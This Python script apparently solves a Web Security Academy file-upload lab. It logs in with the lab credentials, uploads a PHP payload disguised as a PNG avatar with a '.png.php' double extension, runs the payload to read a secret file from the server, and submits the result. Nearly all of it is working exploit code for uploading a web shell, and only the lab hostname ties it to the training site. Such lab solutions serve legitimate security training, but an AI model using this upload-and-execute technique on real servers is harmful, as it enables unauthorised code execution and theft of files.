import requests
from bs4 import BeautifulSoup

site = '0a6200d504ea75f382b5f60300b700da.web-security-academy.net'
login_url = f'https://{site}/login'
account_url = f'https://{site}/my-account'
upload_url = f'https://{site}/my-account/avatar'
webshell_url = f'https://{site}/files/avatars/secret.php'
submit_url = f'https://{site}/submitSolution'

s = requests.Session()

# Step 1: Get CSRF token for login
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Step 2: Login
login_data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
resp = s.post(login_url, data=login_data)

# Step 3: Go to my-account and get new CSRF for avatar upload
resp = s.get(account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Step 4: Prepare the malicious PHP script payload
php_payload = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
# Trick the server by uploading a PNG with PHP code in the content (double extension: .png.php)
image_content = b'\x89PNG\r\n\x1a\n' + b'\x00' * 1000 + php_payload.encode('utf-8')

# Upload the "malicious image"
multipart_form_data = {
    'csrf': (None, csrf),
    'user': (None, 'wiener'),
    'avatar': ('malicious_avatar.png.php', image_content, 'image/png')  # use the allowed content type
}
resp = s.post(upload_url, files=multipart_form_data)

# Print out the response returned after uploading
print("multipart_form_data: ", resp.text)

# Step 5: Execute the uploaded PHP file to get the secret
secret_url = f'https://{site}/files/avatars/malicious_avatar.png.php'
resp = s.get(secret_url)
secret = resp.text.strip()
print(f"Secret from Carlos's home: {secret}")

# Step 6: Submit the solution
solution_data = {
    'answer': secret
}
resp = s.post(submit_url, data=solution_data)

# Final status check
if "Congratulations" in resp.text:
    print("✅ Lab solved!")
else:
    print("❌ Something went wrong. Double check your steps.")
